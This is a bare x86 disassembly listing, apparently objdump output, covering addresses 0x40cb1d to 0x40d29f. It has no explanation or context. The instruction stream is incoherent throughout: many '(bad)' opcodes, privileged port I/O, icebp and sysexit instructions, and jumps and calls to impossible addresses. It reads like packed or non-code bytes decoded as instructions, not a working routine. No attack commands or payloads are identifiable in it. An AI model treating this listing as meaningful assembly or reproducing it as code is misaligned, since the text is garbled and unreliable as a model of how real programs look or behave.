  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
